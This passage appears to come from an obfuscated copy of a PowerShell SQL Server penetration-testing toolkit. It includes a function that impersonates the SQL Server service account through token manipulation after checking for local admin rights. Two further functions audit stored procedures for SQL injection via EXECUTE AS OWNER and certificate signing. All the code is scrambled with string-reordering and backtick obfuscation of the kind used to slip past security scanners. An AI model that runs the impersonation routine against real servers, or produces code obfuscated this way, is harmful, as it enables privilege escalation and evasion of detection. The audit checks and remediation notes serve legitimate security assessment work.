        &("{2}{1}{0}" -f 'bose','er','Write-V') -Message ("$Instance "+': '+'S'+'TART '+'V'+'ULNE'+'RABIL'+'ITY'+' '+'CHEC'+'K'+': '+'[VULNERABIL'+'ITY'+' '+'N'+'AME]')

        
        ${T`EsTCOnNec`TI`oN} = &("{1}{2}{0}{4}{3}" -f 'nnect','Get-','SQLCo','st','ionTe') -Instance ${INS`TA`NCe} -Username ${USeR`N`AMe} -Password ${P`As`sWo`Rd} -Credential ${c`Re`dEN`Tial} -SuppressVerbose | &("{3}{2}{0}{1}" -f 'Obje','ct','e-','Wher') -FilterScript {
            ${_}."St`AT`Us" -eq ("{1}{0}{2}"-f 'ess','Acc','ible')
        }
        if(-not ${tEsT`COn`NEc`TioN})
        {
            
            &("{2}{0}{1}" -f'-Ver','bose','Write') -Message ("$Instance "+': '+'CONN'+'E'+'CTION '+'FAIL'+'E'+'D.')
            &("{1}{2}{0}"-f'ose','Write-Ve','rb') -Message ("$Instance "+': '+'COMPLE'+'TED'+' '+'VULNE'+'RAB'+'ILITY '+'CH'+'ECK'+': '+'[VULNERA'+'BIL'+'I'+'TY '+'NAME'+'].')
            Return
        }
        else
        {
            &("{0}{1}{2}" -f 'Write','-V','erbose') -Message ("$Instance "+': '+'CO'+'NNECTI'+'ON'+' '+'SU'+'CCES'+'S.')
        }

        
        ${sE`RV`ERI`NFo} = &("{0}{3}{2}{1}{4}" -f 'Get-S','rverI','LSe','Q','nfo') -Instance ${iN`s`T`ANcE} -Username ${Us`erN`AMe} -Password ${p`ASSwoRD} -Credential ${C`REdEnt`I`AL}
        ${cU`R`Re`NTLOGin} = ${se`RverI`N`FO}."CUR`Re`Nt`lOGIN"
        ${Com`Pu`Te`RNAmE} = ${Se`R`VERin`Fo}."C`OMpUT`eRN`Ame"

        
        
        
        if(${ex`PLO`it})
        {
            ${tES`T`MoDE}  = ("{0}{1}"-f 'Explo','it')
        }
        else
        {
            ${Te`S`TMoDE}  = ("{0}{1}"-f 'Aud','it')
        }
        ${VUlne`R`A`Bili`TY} = ''
        ${DES`cR`IP`TIoN}   = ''
        ${remE`D`IaT`Ion}   = ''
        ${s`EV`ERIty}      = ''
        ${IsV`UlnE`RAB`Le}  = 'No'
        ${IsE`XpLO`iT`AbLe} = 'No'
        ${e`X`plo`iTed}     = 'No'
        ${EX`p`loITCmd}    = ('['+'Cur'+'rentCom'+'ma'+'nd] '+'-'+'In'+'sta'+'nce '+"$Instance "+'-'+'Ex'+'ploit')
        ${D`EtAi`Ls}       = ''
        ${Re`F`EReNCE}     = ''
        ${aU`T`hOr}        = (("{6}{7}{2}{5}{4}{1}{3}{0}" -f' Year','t','t La','ter), Company','i','st (Tw','Fi','rs'))

        
        
        
        
        


        
        
        
        
        


        
        
        
        
        


        
        ${n`Ull} = ${tbldA`Ta}."R`owS".("{1}{0}" -f 'dd','A').Invoke(${Co`mp`UtER`NA`me}, ${IN`STa`N`ce}, ${Vu`LnERAbIL`ITy}, ${D`eSc`RiPTIOn}, ${remeD`iA`Tion}, ${Se`V`eRiTY}, ${i`svUlN`e`RA`BLE}, ${iS`eXpLOIta`B`lE}, ${Expl`Oi`Ted}, ${E`Xp`LoItCmd}, ${D`ETAi`ls}, ${r`e`F`eRencE}, ${auT`h`or})

        
        &("{2}{0}{1}"-f 'rite','-Verbose','W') -Message ("$Instance "+': '+'COM'+'P'+'LETED '+'V'+'ULNE'+'RA'+'BILITY '+'CHECK'+': '+'[V'+'ULNERA'+'BILI'+'TY '+'N'+'AME]')
    }

    End
    {
        
        if ( -not ${Noo`Utp`Ut})
        {
            Return ${TBLDA`TA}
        }
    }
}






Function  i`NvoKe-SqLim`PersON`AT`esERvice
{
    
    [CmdletBinding()]
    Param(
        [Parameter(mAnDaTory = ${FAL`se},
                VALUEfrOmPipelInebypRoPErtYnaMe = ${tr`Ue},
        HELPMeSsAge = {"{0}{2}{3}{4}{1}{8}{9}{7}{5}{6}"-f'SQL Serve','e','r ','ins','tanc',' ','connection to.','o',' ','t'})]
        [string]${iNS`TAn`cE},

        [Parameter(mANDATOry = ${Fal`Se},
                VaLueFrOmPiPelinebYPROpeRtYnaMe = ${Tr`Ue},
        HeLpMESSaGE = {"{3}{6}{1}{0}{9}{2}{5}{4}{7}{10}{11}{8}"-f'rev','o ',' origina','This can ','Win','l ','be used t','dows user ','t.','ert to the','cont','ex'})]
        [switch]${ReV`2`selF},

        [Parameter(mANDatORY = ${Fa`l`SE},
        hElPmesSaGE = {"{5}{8}{10}{11}{4}{13}{3}{1}{6}{16}{9}{2}{14}{7}{15}{12}{0}" -f'd.','. ','en ','rors','se e','Sup',' ','tion i','press ','h','v','erbo','ppe','r','func','s wra','Used w'})]
        [switch]${S`Up`PR`Essver`BO`Se}
    )

    Begin
    {
    }

    Process
    {
        
        
        if(${re`V2S`ELF}){          
            &("{4}{1}{3}{5}{2}{0}{6}" -f 'la','nvo','ipu','ke-Token','I','Man','tion') -RevToSelf | &("{0}{1}" -f'Out-N','ull')
            Return
        }

        
        if(-not ${i`NStAnCe}){
            &("{2}{4}{0}{1}{3}" -f '-Verb','os','Wri','e','te') ("$Instance "+': '+'No'+' '+'inst'+'anc'+'e '+'pr'+'ov'+'ided.')
            Return
        }

        
        ${Wi`NcUrr`e`Nt`UsErNAmE} =   $UTNJP::("{1}{2}{0}" -f'rent','GetC','ur').Invoke()."n`AMe"

        
        ${Is`AD`miN} = &("{5}{0}{2}{1}{6}{4}{3}"-f 'SQLLoca','dmi','lA','ck','e','Get-','nCh')
                
        
        if(${isa`D`mIN} -ne ${t`RUE}){
            &("{3}{2}{0}{1}"-f't','e-verbose','ri','w')  ("$Instance "+': '+"$WinCurrentUserName "+'DO'+'ES '+'NO'+'T '+'ha'+'ve '+'l'+'oca'+'l '+'ad'+'min '+'pri'+'vileges'+'.')
            return
        }else{
            &("{0}{1}{2}"-f'write-','ve','rbose')  ("$Instance "+': '+"$WinCurrentUserName "+'ha'+'s '+'lo'+'cal'+' '+'a'+'dmin '+'pr'+'ivi'+'leges.')
        }

        
        &("{1}{0}{2}"-f 'ite-Verbo','Wr','se') -Message ("$Instance "+': '+'Impers'+'onatin'+'g'+' '+'SQL'+' '+'Ser'+'v'+'er '+'proc'+'ess'+':') 
        [int]${TA`RGEtp`ID} = &("{3}{2}{4}{5}{0}{1}" -f'c','eLocal','-SQLSe','Get','r','vi') -SuppressVerbose -instance ${i`NS`TAN`CE} -RunOnly | &("{2}{1}{0}"-f'ject','b','Where-O') {${_}."SERv`Ic`EPath" -like ("{2}{0}{1}{3}"-f 'sqlservr.','ex','*','e*')} | &("{0}{1}{2}"-f'Sele','ct-Objec','t') ("{1}{4}{0}{3}{2}"-f 'oce','S','sId','s','ervicePr') -ExpandProperty ("{0}{1}{3}{2}" -f'S','er','eProcessId','vic')
        [string]${TaRg`eTServI`c`eA`C`COunT} = &("{0}{3}{2}{1}" -f'G','SQLServiceLocal','t-','e') -SuppressVerbose -instance ${i`N`STancE} -RunOnly | &("{3}{1}{0}{2}"-f 'c','e-Obje','t','Wher') {${_}."sEr`VICeP`Ath" -like ("{1}{0}{3}{2}"-f 'se','*sql','*','rvr.exe')} | &("{0}{3}{2}{1}" -f'Sel','ct','-Obje','ect') ("{0}{1}{2}"-f 'Se','rviceA','ccount') -ExpandProperty ("{2}{1}{3}{0}" -f 'nt','ice','Serv','Accou')
                
        
        if (${t`A`RGEtpID} -eq 0){
            &("{2}{0}{3}{4}{1}"-f '-','se','Write','Ver','bo') -Message ("$Instance "+': '+'N'+'o '+'proce'+'ss '+'run'+'ni'+'ng '+'f'+'or '+'pro'+'vide'+'d '+'ins'+'t'+'ance...')
            return
        }

        
        &("{0}{2}{1}" -f 'Wr','te-Verbose','i') -Message ("$Instance "+': '+'- '+'Pro'+'c'+'ess '+'ID'+': '+"$TargetPid")
        &("{2}{0}{1}" -f 'rite-Verb','ose','W') -Message ("$Instance "+': '+'- '+'Ser'+'vic'+'e'+'Accoun'+'t: '+"$TargetServiceAccount") 
                
        
        try{
            &("{0}{1}{2}"-f'Ge','t-P','rocess') | &("{3}{0}{2}{1}"-f 'ere-Obj','ct','e','Wh') {${_}."Id" -like ${t`AR`gETP`Id}} | &("{1}{0}{2}{4}{3}"-f 'Manipu','Invoke-Token','l','tion','a') -Instance ${iN`ST`ANcE} -ImpersonateUser -ErrorAction ("{2}{1}{0}" -f'tinue','on','C') | &("{0}{1}{2}"-f'Out-N','u','ll')               
        }catch{
            ${eRR`o`RmESSA`ge} = ${_}."EXcE`pt`ION"."mES`sAGE"
            &("{1}{0}{2}" -f 'rite-Verbo','W','se') -Message ("$Instance "+': '+'Impersonati'+'on'+' '+'fail'+'ed.')
            &("{0}{1}{3}{4}{2}" -f 'W','ri','bose','te-Ve','r')  -Message (' '+"$Instance "+': '+"$ErrorMessage")
            return
        }  
        
        &("{2}{0}{3}{1}" -f'-V','se','Write','erbo')  -Message ("$Instance "+': '+'D'+'one.')                    
    }

    End
    {
    }
}






Function I`N`VOKE-SQ`l`Au`D`iTsqlispE`X`ecUTEaS
{
    
    [CmdletBinding()]
    Param(
        [Parameter(MANDATory = ${f`AL`sE},
                valUEFroMpIPelIneBYpROPErtYNAmE = ${TR`UE},
        HElPmesSAgE = {"{1}{0}{8}{3}{2}{4}{7}{6}{5}"-f'er or ','SQL Serv',' ','unt to','auth','h.','ticate wit','en','domain acco'})]
        [string]${USE`R`NAME},

        [Parameter(MAnDatoRY = ${FaL`sE},
                vALueFrOmpipelInEByprOPErTynAME = ${TR`Ue},
        hELpmeSsage = {"{10}{8}{15}{13}{0}{16}{1}{3}{12}{2}{17}{4}{7}{9}{14}{6}{11}{5}"-f'main a','t',' to',' pa','a','.','w','ut',' ','henticate','SQL','ith','ssword','r or do',' ','Serve','ccoun',' '})]
        [string]${PA`SsWo`Rd},

        [Parameter(MandAtOrY = ${FA`l`se},
                VaLUEfroMPIpelinEbYPROpeRtYNAME = ${T`Rue},
        HElPMeSSAgE = {"{3}{4}{6}{2}{5}{1}{0}" -f'.','ls','credenti','W','i','a','ndows '})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${c`REd`ENt`IAL} =   (vARIabLE  0459m2 -VAL)::"e`MPtY",

        [Parameter(MaNDAtOrY = ${F`AL`SE},
                VaLuEFROMpIPELINEByPropertYnAME = ${Tr`Ue},
        helPmESSage = {"{2}{0}{6}{1}{4}{5}{3}"-f 'L Server ins',' ','SQ','tion to.','to co','nnec','tance'})]
        [string]${inS`TAnCe},

        [Parameter(mAnDaTOrY = ${fA`lSe},
        heLpmeSSage = {(("{0}{1}{2}{4}{5}{3}" -f 'DonfH1t ou','tpu','t any','.','thin','g'))."Rep`LaCe"('fH1',[StRING][ChaR]39)})]
        [string]${n`Oo`UtPUt},

        [Parameter(MAndaTory = ${F`Al`Se},
        hElPMesSaGE = {"{3}{5}{2}{4}{1}{0}" -f 's.','e issue','oit vu','Ex','lnerabl','pl'})]
        [switch]${eXP`L`Oit}
    )

    Begin
    {
        
        ${T`Bld`AtA} = &("{0}{1}{2}" -f 'New','-Obj','ect') -TypeName ("{0}{1}{5}{3}{4}{2}" -f 'Sys','tem.D','ble','at','aTa','ata.D')
        ${nu`ll} = ${t`BLdATA}."C`olUMnS".("{0}{1}" -f 'A','dd').Invoke(("{0}{2}{3}{1}"-f 'C','e','omputerN','am'))
        ${nu`Ll} = ${tB`L`datA}."cO`L`UmNs".("{1}{0}"-f'd','Ad').Invoke(("{2}{1}{0}"-f 'nce','ta','Ins'))
        ${N`ULL} = ${T`B`LdatA}."c`OLUMNS".("{1}{0}"-f'dd','A').Invoke(("{2}{3}{0}{1}" -f 'bilit','y','V','ulnera'))
        ${nU`lL} = ${tBl`DA`Ta}."COl`Um`NS".("{0}{1}" -f 'Ad','d').Invoke(("{0}{2}{1}"-f'Des','n','criptio'))
        ${nU`LL} = ${tbLDa`TA}."co`L`UmNS".("{1}{0}" -f 'dd','A').Invoke(("{3}{1}{0}{2}" -f 'i','d','ation','Reme'))
        ${n`ULL} = ${Tbl`d`Ata}."C`o`lUmnS".("{1}{0}" -f 'dd','A').Invoke(("{0}{2}{1}" -f 'Se','ity','ver'))
        ${nu`ll} = ${TBL`D`Ata}."CO`lu`mNS".("{1}{0}"-f 'dd','A').Invoke(("{2}{3}{1}{0}"-f'able','lner','Is','Vu'))
        ${N`Ull} = ${t`Bl`DaTa}."Co`LUMnS".("{0}{1}" -f'Ad','d').Invoke(("{2}{0}{1}"-f'sEx','ploitable','I'))
        ${N`ULl} = ${tBLD`A`Ta}."coL`U`mnS".("{1}{0}" -f'd','Ad').Invoke(("{2}{0}{1}"-f 'e','d','Exploit'))
        ${N`ULl} = ${tbL`d`AtA}."Colu`Mns".("{0}{1}" -f 'A','dd').Invoke(("{0}{2}{1}"-f'Exploi','d','tCm'))
        ${n`Ull} = ${tbLda`Ta}."cOL`UMNs".("{1}{0}" -f 'd','Ad').Invoke(("{2}{1}{0}"-f 'tails','e','D'))
        ${n`ULl} = ${TbL`D`ATA}."C`Olum`Ns".("{1}{0}"-f'dd','A').Invoke(("{0}{1}{2}" -f 'Refe','re','nce'))
        ${N`ULL} = ${TBL`d`ATA}."Co`luM`Ns".("{0}{1}"-f 'A','dd').Invoke(("{1}{0}"-f'thor','Au'))
    }

    Process
    {
        
        &("{2}{1}{0}"-f 'e-Verbose','it','Wr') -Message ("$Instance "+': '+'STA'+'R'+'T '+'VUL'+'N'+'E'+'RABILITY '+'CH'+'ECK:'+' '+'Pot'+'enti'+'al '+'S'+'QL '+'Inject'+'io'+'n'+' '+'- '+'EXEC'+'UT'+'E '+'AS'+' '+'OW'+'NER')

        
        ${t`E`StcOn`NE`ctIoN} = &("{2}{5}{3}{4}{6}{1}{0}" -f 'nTest','io','G','S','QLConnec','et-','t') -Instance ${I`NsT`AnCE} -Username ${u`s`ErnAME} -Password ${paSsW`ord} -Credential ${crEd`en`TI`AL} -SuppressVerbose | &("{0}{3}{2}{1}" -f'Wher','t','-Objec','e') -FilterScript {
            ${_}."sT`A`TUs" -eq ("{0}{2}{1}" -f 'Ac','ssible','ce')
        }
        if(-not ${tesTconn`E`C`TI`on})
        {
            
            &("{2}{1}{3}{0}"-f'Verbose','te','Wri','-') -Message ("$Instance "+': '+'CO'+'NNEC'+'TIO'+'N '+'FAILE'+'D'+'.')
            &("{1}{0}{3}{2}"-f 'i','Wr','Verbose','te-') -Message ("$Instance "+': '+'CO'+'MPL'+'ETE'+'D '+'VU'+'L'+'NERAB'+'ILITY '+'C'+'HECK'+': '+'Potent'+'i'+'al'+' '+'S'+'QL '+'Injec'+'tio'+'n '+'- '+'E'+'XE'+'CUTE '+'A'+'S '+'OWNE'+'R.')
            Return
        }

        
        ${SeR`Ve`RiNFO} = &("{1}{4}{3}{0}{2}"-f'LS','Get','erverInfo','Q','-S') -Instance ${INstA`NCE} -Username ${uSeRN`A`mE} -Password ${pa`SSwOrd} -Credential ${CReDE`NTi`AL} -SuppressVerbose
        ${curRen`TL`Og`IN} = ${SeR`Ver`in`FO}."cUR`RENTL`oG`in"
        ${c`ompute`RnAmE} = ${se`RVeR`i`NfO}."co`MpUtEr`NAMe"

        
        
        
        if(${eX`PL`OIt})
        {
            ${Tes`TMO`dE}  = ("{1}{0}{2}" -f 'oi','Expl','t')
        }
        else
        {
            ${T`esTM`OdE}  = ("{0}{1}" -f 'Audi','t')
        }
        ${vULn`era`BilIty} = ("{8}{0}{4}{3}{1}{5}{7}{2}{9}{6}"-f'te','L Injection ','ECUTE','ial SQ','nt','- ',' OWNER','EX','Po',' AS')
        ${Des`crIP`Tion}   = ((("{43}{38}{31}{9}{37}{40}{25}{21}{14}{46}{33}{34}{13}{42}{27}{41}{3}{44}{6}{23}{22}{12}{8}{48}{39}{7}{47}{15}{28}{45}{24}{2}{49}{30}{16}{5}{35}{20}{1}{11}{29}{4}{32}{36}{19}{17}{18}{10}{26}{0}"-f 'e.','r if S','to','the {0}','j','e pro','TE A','ay','a r','d','ib','QL ','use.  As ','m',' ','e ','te th',' is',' poss','n','wne','is',' cla','S OWNER{0}','ble ',' ','l','d','po','in','mpersona','ffecte','ec','sing dy','na','cedure o','tio',' pr','a',', it m','ocedure',' ','ic SQL an','The ','EXECU','ssi','u',' b','esult',' i')) -f  [chAr]34)
        ${rEm`eD`IATI`oN}   = ((("{24}{12}{33}{5}{30}{11}{20}{16}{1}{0}{9}{34}{8}{22}{38}{36}{32}{28}{21}{27}{3}{7}{18}{23}{13}{35}{14}{31}{29}{19}{37}{10}{25}{4}{17}{15}{6}{2}{39}{26}"-f'o','d ','a','o',' AS OWNERF','arameteriz','cl','ce','atenated string','f co','T','d que','sider us','s','stead','6 ',' instea','i','dur','XEC','ries','p','s, ','e','Con','E','.','r','igned ','6E','e',' of the Fi',' s','ing p','nc',' in','use','U','and ','use'))-crEplAcE'Fi6',[CHaR]34)
        ${se`VeR`ITy}      = ("{0}{1}" -f 'H','igh')
        ${i`Sv`UlN`ErAblE}  = 'No'
        ${iseX`PlO`ItaB`LE} = 'No'
        ${e`xP`LoiteD}     = 'No'
        ${e`XpLOI`TCMd}    = ('No'+' '+'a'+'u'+'tomated '+'expl'+'oit'+'ation '+'o'+'ption '+'has'+' '+'been'+' '+'provi'+'ded,'+' '+'bu'+'t '+'t'+'o '+'view'+' '+'the'+' '+'pro'+'cedu'+'re '+'c'+'ode '+'us'+'e: '+'Get-'+'SQ'+'LStoredPr'+'oc'+'e'+'dureS'+'Q'+'Li '+'-'+'V'+'erbose '+'-Inst'+'anc'+'e '+"$Instance "+'-K'+'e'+'ywo'+'rd '+"`"EXECUTE "+'AS'+' '+"OWNER`"'")
        ${dEt`A`ilS}       = ''
        ${refe`R`En`CE}     = ("{11}{15}{26}{20}{14}{0}{3}{27}{8}{1}{5}{4}{18}{21}{22}{9}{2}{25}{6}{12}{7}{16}{24}{17}{19}{13}{23}{10}"-f'tspi.com/hac','er-s','3','king-','du','tored-proce','-a','d-us','-serv','rt-','n','h','n','rso','://blog.ne','t','er','imp','res','e','s','-p','a','natio','-','-sqli','tp','sql')
        ${AUT`H`or}        = (("{3}{7}{2}{6}{0}{8}{9}{4}{5}{1}" -f 'd), ','2016','Su','Scott','SPI',' ','therland (@_nullbin',' ','Ne','t'))

        
        
        
        
        
                
        
        ${sqlIr`e`Su`lTS} = &("{5}{0}{2}{4}{3}{1}" -f 't-','eSQLi','SQLStoredPro','edur','c','Ge') -Instance ${I`N`stAnCe} -Username ${USeR`N`A`ME} -Password ${PA`SSw`ORD} -Credential ${CR`eDEntI`Al} -Keyword ("{1}{0}{3}{2}{4}" -f'XECU','E','S','TE A',' OWNER') 
        
        
        if(${S`QLI`ResUL`Ts}."R`OwS"."COu`Nt" -ge 1){
            
            
            ${I`SvUL`NEraBle} = "Yes"
            ${IsExPlO`i`TAb`lE} = ("{0}{1}"-f'Unkno','wn')

            
            ${sqLI`R`ES`ULtS} |
            &("{3}{1}{2}{0}"-f't','-Obj','ec','ForEach'){
            
                
                ${DAta`BA`seNAMe} = ${_}."DAT`A`BASEN`AMe" 
                ${S`ChE`manA`ME} = ${_}."sC`h`EMANaME"
                ${pr`O`cED`UrEnAme} = ${_}."P`RocEDuRe`NaME"
                ${O`BjeCTn`AmE} = "$DatabaseName.$SchemaName.$ProcedureName"
                ${DETA`i`lS} =  ('T'+'he '+"$ObjectName "+'sto'+'red '+'p'+'rocedu'+'re '+'i'+'s '+'affec'+'ted'+'.')
                
                
                ${Nu`lL} = ${T`Bl`daTa}."r`Ows".("{1}{0}"-f'd','Ad').Invoke(${CO`mPUTerna`mE}, ${Inst`An`Ce}, ${vUl`N`e`RABiLI`Ty}, ${D`eScrIPt`ION}, ${ReM`eDi`ATI`oN}, ${S`EVeRI`Ty}, ${ISVu`lnErAb`lE}, ${iSeXP`L`o`itAbLE}, ${e`Xp`lOiT`ED}, ${EXpL`Oit`C`MD}, ${DE`TA`iLs}, ${refe`R`ence}, ${AUt`H`OR})        
            }
        }    

        
        
        
        if(${EXp`L`oit}){
            &("{2}{1}{4}{0}{3}"-f'erbo','rit','W','se','e-V') ("$Instance "+': '+'No'+' '+'automa'+'t'+'ic '+'exp'+'loitat'+'ion '+'optio'+'n '+'has'+' '+'been'+' '+'p'+'rovid'+'ed. '+'Un'+'in'+'forme'+'d '+'e'+'xp'+'loitation '+'of'+' '+'SQL'+'i '+'c'+'an '+'have'+' '+'a '+'nega'+'ti'+'ve '+'impac'+'t '+'on'+' '+'pr'+'oduct'+'ion'+' '+'enviro'+'n'+'ment'+'s.')
        }

        
        &("{3}{0}{2}{1}" -f 'rite-V','bose','er','W') -Message ("$Instance "+': '+'CO'+'MPLE'+'TED '+'VU'+'LNERAB'+'I'+'LITY '+'CH'+'ECK: '+'Potentia'+'l'+' '+'S'+'QL '+'Inje'+'ction'+' '+'- '+'EX'+'ECUT'+'E '+'A'+'S '+'OWNE'+'R')
    }

    End
    {
        
        if ( -not ${N`o`oUTPuT})
        {
            Return ${t`Bld`Ata}
        }
    }
}






Function inv`oke-sqlAUdi`T`S`ql`I`sPSIGn`Ed
{
    
    [CmdletBinding()]
    Param(
        [Parameter(mandAtOry = ${f`AL`SE},
                VALuEfRoMpIpeLINEBYprOpERtynaMe = ${T`RUE},
        heLpmessAGE = {"{5}{3}{4}{8}{7}{6}{2}{0}{1}" -f'he','nticate with.','unt to aut','rver',' or d','SQL Se','o','main acc','o'})]
        [string]${UsErn`AMe},

        [Parameter(MANdAToRy = ${FA`L`SE},
                valueFROmpiPelineByProperTYNAmE = ${t`RUe},
        HeLPMeSsaGe = {"{12}{8}{2}{10}{5}{0}{3}{1}{6}{7}{4}{9}{13}{11}"-f'n a','oun','er','cc','swo','r domai','t',' pas',' S','rd to','ver o','authenticate with.','SQL',' '})]
        [string]${P`AsS`wOrD},

        [Parameter(maNDAtORy = ${f`AlsE},
                VaLUEFROmpIpelINEBypROpertynAme = ${Tr`Ue},
        hELPMESsAgE = {"{0}{3}{2}{5}{4}{1}"-f 'Windows','s.','re',' c','ntial','de'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${cR`e`d`ENTIAL} =   ( gEt-VArIAblE ('0'+'459m2') -ValuE)::"e`MpTY",

        [Parameter(mAnDATorY = ${FA`LSE},
                vaLUEFroMPIPELiNEbYPrOPerTynAME = ${t`RUE},
        HeLpMESSAGE = {"{5}{8}{3}{4}{6}{2}{10}{1}{7}{9}{0}"-f 'ion to.','onne',' t','rv','er i','SQL S','nstance','c','e','t','o c'})]
        [string]${iNSt`A`NcE},

        [Parameter(MaNDAtOry = ${F`AL`se},
        hElpmeSsaGe = {(("{3}{4}{2}{0}{1}" -f 'anythin','g.','utput ','Don{','0}t o'))-f[Char]39})]
        [string]${NOoUtp`Ut},

        [Parameter(ManDaTOry = ${F`ALSE},
        hELPMeSsage = {"{4}{0}{3}{5}{1}{2}" -f 'p','ulnerab','le issues.','l','Ex','oit v'})]
        [switch]${eX`ploiT}
    )

    Begin
    {
        
        ${Tb`Ld`Ata} = &("{1}{0}{2}"-f '-Obj','New','ect') -TypeName ("{1}{0}{2}{4}{3}"-f'Data.','System.','Da','Table','ta')
        ${NU`Ll} = ${t`Bl`data}."C`oLuMns".("{0}{1}"-f'Ad','d').Invoke(("{1}{2}{0}{3}" -f'u','Com','p','terName'))
        ${Nu`LL} = ${tbl`d`Ata}."CoL`UmnS".("{1}{0}"-f'dd','A').Invoke(("{0}{1}"-f 'In','stance'))
        ${Nu`ll} = ${tbLDa`TA}."C`OLumNS".("{0}{1}"-f 'Ad','d').Invoke(("{0}{1}{2}" -f 'Vulnerabi','l','ity'))
        ${N`Ull} = ${TB`LDa`TA}."c`oLU`Mns".("{0}{1}" -f 'Ad','d').Invoke(("{2}{3}{0}{1}" -f 'pt','ion','De','scri'))
        ${nu`LL} = ${TB`l`data}."COlU`m`NS".("{0}{1}" -f'A','dd').Invoke(("{2}{0}{1}{3}" -f'at','io','Remedi','n'))
        ${nU`LL} = ${Tbl`D`ATA}."coL`UmNs".("{1}{0}" -f'd','Ad').Invoke(("{0}{1}{2}" -f'Sev','eri','ty'))
        ${N`ULl} = ${T`BLdA`TA}."cOLuM`Ns".("{0}{1}" -f'A','dd').Invoke(("{3}{1}{0}{2}"-f'e','sVuln','rable','I'))
        ${nU`ll} = ${TBl`Data}."COlu`MNS".("{0}{1}" -f 'A','dd').Invoke(("{1}{2}{0}" -f'ploitable','I','sEx'))
        ${N`Ull} = ${T`BL`dAtA}."co`LUMns".("{0}{1}"-f 'A','dd').Invoke(("{2}{0}{1}"-f'it','ed','Explo'))
        ${n`UlL} = ${T`BldatA}."c`Olumns".("{0}{1}"-f'A','dd').Invoke(("{1}{2}{0}"-f'md','Expl','oitC'))
        ${NU`lL} = ${TBLD`A`TA}."c`OL`Umns".("{0}{1}" -f 'A','dd').Invoke(("{0}{1}{2}" -f 'D','etail','s'))
        ${nU`ll} = ${tb`ld`ATa}."cOLUm`Ns".("{0}{1}"-f 'A','dd').Invoke(("{1}{0}"-f'e','Referenc'))
        ${nu`lL} = ${tbl`DaTa}."c`OlU`MNs".("{1}{0}"-f 'dd','A').Invoke(("{1}{0}"-f'r','Autho'))
    }

    Process
    {
        
        &("{1}{2}{0}" -f'erbose','Wr','ite-V') -Message ("$Instance "+': '+'S'+'TAR'+'T '+'V'+'U'+'LN'+'ERABILI'+'TY '+'C'+'HE'+'CK: '+'P'+'ot'+'ential '+'S'+'QL '+'I'+'nj'+'ection '+'- '+'Sign'+'ed '+'by'+' '+'Ce'+'rtificat'+'e '+'Logi'+'n')

        
        ${t`estCo`NN`eCt`iON} = &("{1}{0}{2}{3}{4}"-f'tio','Get-SQLConnec','nTe','s','t') -Instance ${iN`S`TaNce} -Username ${us`eR`N`AMe} -Password ${pas`S`w`oRd} -Credential ${cR`Eden`TIal} -SuppressVerbose | &("{1}{0}{2}"-f're-Objec','Whe','t') -FilterScript {
            ${_}."sta`T`US" -eq ("{0}{3}{2}{1}"-f'Ac','ble','ssi','ce')
        }
        if(-not ${Te`STcO`NnEC`TiOn})
        {
            
            &("{3}{2}{1}{0}"-f'e','bos','ite-Ver','Wr') -Message ("$Instance "+': '+'CONNEC'+'T'+'ION '+'FAI'+'LE'+'D.')
            &("{2}{0}{3}{1}" -f'Verb','e','Write-','os') -Message ("$Instance "+': '+'COM'+'PLE'+'TED '+'VULN'+'ERABILI'+'TY'+' '+'CHE'+'C'+'K: '+'P'+'oten'+'tial '+'SQ'+'L '+'Inj'+'ect'+'ion '+'- '+'Si'+'g'+'ned '+'by'+' '+'Ce'+'r'+'tificate'+' '+'Lo'+'gin.')
            Return
        }

        
        ${sERvE`R`inFo} = &("{0}{1}{4}{2}{3}"-f 'Get','-S','LServ','erInfo','Q') -Instance ${INst`A`NCe} -Username ${U`serNaME} -Password ${pasS`wO`RD} -Credential ${C`REd`enTial} -SuppressVerbose
        ${c`UrREntL`O`giN} = ${S`ERVE`R`inFo}."cuRrenTl`o`giN"
        ${COm`p`Ut`ER`NaMe} = ${s`ErVE`Rin`FO}."cOmP`UteRN`AmE"

        
        
        
        if(${ExPL`OIT})
        {
            ${te`sTmo`DE}  = ("{2}{0}{1}"-f'loi','t','Exp')
        }
        else
        {
            ${te`st`mODe}  = ("{0}{1}"-f 'Au','dit')
        }
        ${v`ULneRabi`lI`TY} = ("{9}{2}{1}{7}{8}{0}{10}{4}{3}{5}{6}"-f'e',' Injection - S','al SQL','ficate L','ti','ogi','n','ig','n','Potenti','d by Cer')
        ${DeS`CRI`Pt`iOn}   = ("{7}{6}{20}{5}{41}{18}{39}{13}{47}{45}{35}{21}{14}{29}{37}{43}{34}{16}{15}{30}{3}{1}{26}{25}{36}{38}{9}{10}{4}{42}{23}{40}{12}{19}{48}{2}{31}{11}{44}{32}{28}{24}{8}{33}{17}{27}{0}{46}{22}"-f'ib','ogin.  ','nate s','l',' be',' proc','e','The affect','o','t,',' it may','gner','ible','n','SQL','rtific','y a ce',' pos','du',' to im','d','mic ','e.','po','i','s','A','s','ject',' and has been','ate ','i','f SQL in','n is','gned b','na',' ',' ','a resul','re is usi','ss','e',' ','si',' i','dy','l','g ','perso')
        ${rEmE`diA`T`ioN}   = ("{15}{16}{6}{0}{7}{4}{1}{11}{14}{5}{8}{10}{12}{17}{9}{2}{3}{13}" -f'u','e','ted s','tr',' paramet','u','sider ','sing','eries instead','tena',' ','rized ','of c','ings.','q','C','on','onca')
        ${s`eV`erIty}      = ("{1}{0}" -f 'gh','Hi')
        ${I`s`Vulner`ABLe}  = 'No'
        ${i`s`EX`p`LOITabLE} = 'No'
        ${eXPL`Oit`Ed}     = 'No'
        ${e`xpL`OitCMD}    = ('N'+'o '+'au'+'tomat'+'ed '+'exploitat'+'i'+'on '+'opti'+'on'+' '+'ha'+'s '+'been'+' '+'pro'+'v'+'ided, '+'but'+' '+'t'+'o '+'view'+' '+'the'+' '+'p'+'ro'+'cedure '+'code'+' '+'us'+'e: '+'Get-SQLStored'+'Proc'+'edu'+'r'+'eS'+'QL'+'i '+'-Verb'+'o'+'se '+'-Insta'+'nc'+'e'+' '+"$Instance "+'-O'+'n'+'lySign'+'ed')
        ${De`TA`ilS}       = ''
        ${re`FeRE`Nce}     = ("{20}{2}{5}{1}{4}{23}{10}{21}{9}{7}{22}{18}{16}{3}{11}{12}{17}{19}{8}{24}{15}{13}{6}{14}{0}" -f 'n','.netspi.c','/bl','rt','om','og','i','erver','user-','-s','ack','-3','-sq','onat','o','ers','a','l','s-p','i-and-','https:/','ing-sql','-stored-procedure','/h','imp')
